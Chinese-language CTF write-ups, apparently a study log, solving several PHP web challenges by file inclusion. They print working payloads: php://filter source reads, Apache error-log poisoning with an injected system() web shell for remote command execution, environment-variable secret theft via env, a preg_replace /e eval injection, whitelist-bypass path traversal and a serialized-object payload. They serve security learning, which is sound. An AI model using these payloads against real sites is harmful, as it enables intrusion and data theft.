    Stage 2 · 文档管理系统 — 文件包含到日志注入

    题目类型：Web — PHP 文件包含 + 日志污染

    题目地址：ctfplus 平台实例（已关闭）

    Flag：ZeroGFlag{18e84305-6b07-4aca-84ee-9891c5cb062d}

    题目概述

    一个叫「碰星文件管理」的文档系统，登录页之后是一套像模像样的文件列表、检索、预览界面。

    先看页面有没有可以利用的，到处点了一遍 —— 实际有用的只有一个：文档预览。

    这个预览框能读任意「文档名」，而后端是 include()。

    解题过程

    Step 1：找到唯一有用的功能

    页面上按钮很多（新建、上传、回收站、已发布……），但除了预览，全是空壳。

    预览框输入文件名 → 前端发一个请求：

    fetch('index.php?file=' + encodeURIComponent(name), {method:'GET'})

    接口是 index.php?file=，参数名 file。

    Step 2：直接看 index.php 看不到 —— 用伪协议读源码

    ?file=index.php 返回空 —— 因为 include 把它执行了，而不是打印。

    换成 base64 编码滤镜：

    ?file=php://filter/convert.base64-encode/resource=index.php

    读到 2797 字节的源码。关键就在 include 和那条正则上。

    Step 3：cmd 是个陷阱

    $WAF_PATTERN = '/(flag|cat|ls|\*|\?)/i';

function run_maintenance_command($command)
{
    return system($command);
}

if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    if (preg_match($WAF_PATTERN, $cmd)) { echo "安全策略…"; exit; }
    // 校验通过，命令参数将在文档内容渲染阶段被一并处理
}

    第一眼看像是「命令执行 + WAF」，但拉下去看完整文件会发现：run_maintenance_command() 只有定义，没有调用。

    注释自己也写着「Web 接口层不再直接触发」。

    WAF 保护的是一个什么都不做的空壳 —— 这个入口对我们没有任何实际作用。

    Step 4：真正的终点是 include，它过滤了目录穿越

    $file = str_replace('../', '', $file);   // 剥一次
$file = str_replace('..',  '', $file);   // 再剥一次

$is_stream = preg_match('#^[a-zA-Z0-9._+-]+://#', $file) === 1;

if ($is_stream)               { $target = $file; }
elseif (file_exists($file))   { $target = $file; }
elseif (file_exists('files/' . $file)) { $target = 'files/' . $file; }

if ($target === null) { echo "未找到指定的文档…"; exit; }

include($target);

    两点：

    ① ../ 被剥两次 → 相对穿越走不通（....// 这种双写也是死的）
② 但 file_exists($file) 对绝对路径直接为真 → 绝对路径完全可用

    而且 include 对文件类型的处理不一样：

    include 一个 txt  →  内容原样打印
include 一个 php  →  内容被当代码执行

    Step 5：确认日志路径

    先确认 Apache 还是 nginx 的日志能用：

    ?file=/var/log/apache2/access.log      → 读不到
?file=/var/log/nginx/access.log        → 能读

    但这里有个容易误判的地方 ——文件名写的是 nginx，日志内容却是 Apache 的：

    [Thu Oct 30 ...] [authz_core:error] [pid 23] [client ...]

    authz_core 是 Apache 模块，响应头也写着 Server: Apache/2.4.54 (Debian)。所以文件名只是路径巧合，服务端是 Apache。

    Step 6：access.log 突然 500，只能换 error.log

    一开始对 access.log 用得挺好，后来就一直是 500 —— 原因是别人先注入了一条写坏的 payload：

    script '/var/www/html/<?php eval($_GET['1'];?>.php' not found
                                      └─ 少一个 )，Parse error

    一行的语法错误，就能让整份日志作废（include 时直接 500）。

    所以换 error.log —— 它短、干净。

    Step 7：往 error.log 里注入

    关键：error.log 里那条 script '...' not found 是mod_php 找不到脚本时才写的 —— 只有路径以 .php 结尾才会产生。

    构造：

    GET /%3C%3Fphp%20system(%24_GET[2])%3B%3F%3E.php

    三个要点：

    要点 为什么
    URL 编码 < ? > 空格 不编码的话 ? 会被当成查询串起点，路径被截断
    结尾加 .php 不加就不进 error.log（只会进 access.log）
    payload 带 ?> 不带的话，日志后半截 ' not found... 会被当成 PHP 代码继续解析 → Parse error

    Step 8：先确认，再执行

    注入完不要直接 include，先用滤镜把日志读出来核对（不执行）：

    ?file=php://filter/convert.base64-encode/resource=/var/log/nginx/error.log

    能看到完整的一行：

    script '/var/www/html/<?php system($_GET[2]);?>.php' not found or unable to stat

    确认无误，再执行：

    ?file=/var/log/nginx/error.log&2=ls -la /

    Step 9：/.php 不是被截断，是被执行了

    第一次 include 日志时，看到的是这样：

    script '/var/www/html/.php' not found

    我一开始以为是 payload 被截断了，其实中间那一截是被 include 执行掉了：

    文本:  script '/var/www/html/
代码:  <?php system($_GET[2]);?>      ← 执行，不产生输出
文本:  .php' not found or unable to stat

    执行代码不会把代码本身打印出来 —— 所以那一段在响应里"凭空消失"。

    这也说明：用 include 看日志是「执行后的残骸」，只有 php://filter 才能做取证。

    Step 10：flag 不在 flag 文件里

    ls -la / 看到了：

    -r--------    1 root root   48 Oct 30 06:11 flag
-rwxr-xr-x    1 root root 1507 Oct 16 18:22 entrypoint.sh

    /flag 是 400 root，而当前进程是 uid=33(www-data) —— cat /flag 读不了，权限不够。

    那就读 entrypoint.sh（755，可读）：

    FLAG_VALUE="${ZeroG_2026_FLAG:-}"
export ZeroG_2026_FLAG="$FLAG_VALUE"
printf '%s\n' "$FLAG_VALUE" > "$FLAG_FILE"
chown root:root "$FLAG_FILE"
chmod 400 "$FLAG_FILE"
exec apache2-foreground

    原来如此：flag 来自环境变量 ZeroG_2026_FLAG，写进 /flag 之后还 export 给了 Apache。

    Apache 的子进程继承这个环境变量 → PHP 进程的 /proc/self/environ 里就有。

    ?file=/var/log/nginx/error.log&2=env

    在输出里直接就能看到：

    ZeroG_2026_FLAG=ZeroGFlag{18e84305-6b07-4aca-84ee-9891c5cb062d}

    解题思路总结

    页面到处点 → 只有「文档预览」是真功能
  → 前端 fetch('index.php?file='+name)   ← 泄漏了接口名
    → 直接读 index.php 是空的（被 include 执行了）
      → php://filter/convert.base64-encode 读源码
        → 发现 cmd 是陷阱（函数从未被调用）
          → 真入口是 include，绝对路径放行
            → 日志可读可写 → 注入 PHP 到 error.log
              → include 日志 → RCE
                → /flag 是 400 root 读不了
                  → entrypoint.sh 暴露了 flag 来自环境变量
                    → /proc/self/environ → flag

    漏洞原理

    ① WAF 保护的不一定是真入口

    cmd 参数有完整的 WAF，但它调用的函数从未被调用。真正的入口 file 一处过滤都没有。

    ② 绝对路径让「目录穿越过滤」形同虚设

    ../ 被剥两次，但 include 认绝对路径 —— 过滤只挡住了「相对」这一种写法。

    ③ 把「读文件」变成「执行文件」

    include + 日志 = 我们能把任意字节写进日志，再让它被当成代码执行。

    ④ flag 不一定在 flag 文件里

    /flag 是给 root 看的副本；entrypoint.sh 把它 export 给了 Apache，环境变量里才是我们能拿到的那一份。

    关键知识点

    知识点 说明
    php://filter/convert.base64-encode/resource=x 读源码不执行 —— 绕开 include 的执行
    include 的行为差异 txt 输出、php 执行
    str_replace('../','') 的双重剥除 ....// 这类双写也会被削平
    绝对路径 vs 相对路径 只过滤后者时，前者照样通
    日志注入三要素 路径可控 + 日志可读 + 日志会被 include
    路径必须以 .php 结尾 只有走 mod_php 才有 script not found 这条日志
    URL 编码 < ? > 否则 ? 截断路径
    payload 必须带 ?> 否则日志尾部被当代码解析 → Parse error
    php://filter 与 include 的区别 前者取证，后者执行
    /proc/self/environ 环境变量，常藏着 flag/密码
    entrypoint.sh 容器镜像里常可直接读，暴露启动逻辑
    index.php 完整源码

    [BJDCTF2020] ZJCTF，不过如此

    第一层：text 限制

    $text = $_GET["text"];
$file = $_GET["file"];

if(isset($text) && (file_get_contents($text,'r') === "I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/", $file)){
        die("Not now!");
    }
    include($file);  //next.php
}

    审计代码，观察 text 有内容限制才能走到 include。

    而且 file_get_contents($text,'r') 的 第一个参数是 $text 本身 —— 也就是说 $text 得是一个「能被读取的东西」，不一定是文件路径。

    这里想到用 data 协议，让 file_get_contents 直接读到我们指定的字符串：

    /?text=data://text/plain,I have a dream

    注意：这一步要让 file_get_contents($text) 返回 I have a dream，不是写文件。

    第二层：include 把 next.php 执行了

    接着构造：

    /?text=data://text/plain,I have a dream&file=next.php

    但是页面并没有给出文件内容 —— 因为 include 把 next.php 当成代码执行了，而不是读出来显示。

    所以改用 php 伪协议 读源码（convert.base64-encode 让它不被执行）：

    /?text=data://text/plain,I have a dream&file=php://filter/read=convert.base64-encode/resource=next.php

    解码后得到 next.php 的源码。

    next.php 源码

    <?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}

foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
    @eval($_GET['cmd']);
}

    先看 foreach：它把 GET 得到的名字传给 $re，值传给 $str。

    接着看这个最重要的正则表达式：i 是忽略大小写，e 是 eval，(...) 把整个匹配包成了捕获组 1，也就是 strtolower 里的 \1；在 PHP 单引号中的 \\1 等效于 \1。

    $re 到底在干什么

    $re 就是 URL 里参数的名字，它被直接拼进了正则。

    foreach($_GET as $re => $str)     // $re = 参数名,$str = 参数值
      ↓
'/(' . $re . ')/ei'              // 参数名成了正则主体

    所以 $re 决定了三件事：

    $re 决定 说明
    匹配什么 它必须能匹配到 $str 里的内容，否则 \1 拿不到东西，注入不成立
    捕获组 1 是什么 整个 $re 被 (...) 包住，所以匹配到的内容就是 \1
    替换串里塞进什么 \1 被原样拼进 strtolower("\1")，然后整体被 eval

    反过来说：

    想要代码执行,必须让 匹配到的内容 = 我们的 payload
而"匹配到的内容"由 $re 决定
→ 所以 $re 必须是一个"什么都匹配"的宽泛正则

    还有两个约束：

    ① $re 里不能有 /      → 会把正则模式提前截断
② $re 不能是 .        → PHP 会把参数名里的 . 换成 _

    /e 为什么能执行代码

    替换串是 strtolower("\1")。带 e 修饰符时，替换串会先做反向引用替换，再把结果当成 PHP 代码执行。

    而 \1 在双引号里，所以只要捕获到的内容带 " 或 ${...}，就能跳出字符串变成真代码。

    PHP 5.x 里 ${表达式} 会对表达式求值：

    strtolower("${phpinfo()}")
           └────┬─────┘
        执行 phpinfo()

    所以我们要做的，就是把 \1 的位置变成 ${getFlag()}。

    试错过程

    先试：

    /?.*=${phpinfo()}

    页面无回显。

    原因：PHP 解析 URL 参数时会把参数名里的 . 和空格统一换成 _，所以 .* 变成了 _*，正则变成 /(_*)/ei —— 匹配不到 ${phpinfo()}，所以没反应。

    换 \S（匹配任意非空白字符）代替 .：

    /?\S*=${phpinfo()}

    成功得到回显。

    为什么必须大写 S

    \S = 非空白字符（大写 S 是「非」）。

    \s = 空白字符 —— 写反了就匹配不到 ${phpinfo()}。

    最终 payload

    /next.php?\S*=${getFlag()}&cmd=system('cat /f*');

    注意最后要有分号 —— eval 执行时需要 ; 作为一条代码的结束。

    CTF2{4497b560-3b8c-48c7-9991-bc1d0d9bce8c}

    为什么 cmd 末尾的分号不能省

    getFlag() 里是：

    @eval($_GET['cmd']);

    所以实际执行的是 eval("system('cat /f*');")。

    eval 把字符串当代码重新解析，必须是一条完整语句：

    eval('echo "A"');    // ❌ syntax error, unexpected end of file, expecting ';'
eval('echo "A";');   // ✅

    完整链路

    ① data:// 骗过 file_get_contents     text=data://text/plain,I have a dream
② php://filter 读源码(不执行)        file=php://filter/read=convert.base64-encode/resource=next.php
③ 看懂 foreach:参数名=正则           $re
④ /e 让替换串被 eval                 strtolower("\1")
⑤ 用 \S* 当参数名(避开 . 被吃)       ?\S*=${phpinfo()}
⑥ 调 getFlag() 并带 cmd              ?\S*=${getFlag()}&cmd=system('cat /f*');

    知识点

    点 内容
    data:// 让 file_get_contents 读到指定内容
    php://filter 读源码而不执行（convert.base64-encode）
    /e 修饰符 PHP 5.x 专用，替换串被 eval；PHP 7 已移除
    ${表达式} PHP 双引号插值里会对表达式求值（{} 单层，不是 {{}}）
    参数名即输入 foreach($_GET as $re => $str) 让参数名成了攻击面
    parse_str 的坑 参数名里 . 和空格会变成 _
    eval 的分号 必须语法完整，@ 会吞掉报错

    [HCTF 2018] WarmUp

    这道题打开一个靶场后就一个滑稽笑脸，查看页面源代码，发现 source.php，访问后进行代码审计。

    代码结构

    代码由两部分做成。

    前半部分是函数的实现（class emmm 里的 checkFile），后半部分是调用：

    if (!empty($_REQUEST['file'])
    && is_string($_REQUEST['file'])
    && emmm::checkFile($_REQUEST['file'])
) {
    include $_REQUEST['file'];
    exit;
} else {
    echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
}

    先看 hint.php，它给了 flag 的名字。

    checkFile 的三轮检查

    白名单只有两个：

    $whitelist = ["source" => "source.php", "hint" => "hint.php"];

    然后对传入的 $page 做三轮判断：

    ① 原样比对
   if (in_array($page, $whitelist)) return true;

② 截断到 ? 再比对
   $_page = mb_substr($page, 0, mb_strpos($page . '?', '?'));
   if (in_array($_page, $whitelist)) return true;

③ urldecode 之后再截断到 ? 再比对
   $_page = urldecode($page);
   $_page = mb_substr($_page, 0, mb_strpos($_page . '?', '?'));
   if (in_array($_page, $whitelist)) return true;

都不过 → echo "you can't see it"; return false;

    核心就是第 ② 轮：mb_strpos($page . '?', '?') 找到第一个问号，只把问号前面那一段拿去比对。

    所以只要开头是 source.php，后面接什么都行。

    构造 payload

    ?file=source.php?/../../../../ffffllllaaaagggg

    ../ 的数量

    一个一个往上加，直到跳出 web 根目录，正好够到 /ffffllllaaaagggg。

    为什么能过：

    checkFile 看到:  source.php?/../../../../ffffllllaaaagggg
                 └────┬────┘
                 截断到 ? → "source.php" → 在白名单里 ✅

    这道题的要点

    ① 校验和使用的字符串不一致

    checkFile 用 $_page(截断后的)
include   用 $_REQUEST['file'](原始的)

    和路径遍历那六关是同一个模型：校验发生在哪一步，绕过就发生在哪一步之前。

    ② 还有个没被用上的口子

    第 ③ 轮是 urldecode 之后才截断 —— 这意味着 %3f 编码的问号也能触发截断。这次没用上，但换一道题可能就得靠它。

    先进行代码审计，有三个参数：text、file、password，一个一个来。

    一、text

    因为 file_get_contents 读的是文件，所以用 data 协议，构造 payload：

    ?text=data://text/plain,welcome to the zjctf

    成功。

    二、file

    不能包含 flag.php，这个很可能就是 flag。他注释在旁边有一个 useless.php，先读一下文件。

    但是 include 会将其中的 PHP 代码直接执行而不会打印出来（里面没 echo 的情况下，一般都没有），所以这里利用 PHP 伪协议直接将其转换为 base64 的数据，就不会被执行了：

    php://filter/read=convert.base64-encode/resource=useless.php

    对其进行解码后，接着审计代码。

    三、password

    这里看到了 Flag 类的形式：一个 $file，一个打印函数，注释给了提示 flag.php。

    再根据最开始那个代码中 password 会 unserialize($file) 然后打印出来，所以如果要让他打印出 flag.php，就要序列化一个 file 为 flag.php 的类。

    依据那个类的形式进行序列化后，就可以得到 password 的值了。

    四、最终 payload

    ?text=data://text/plain,welcome%20to%20the%20zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
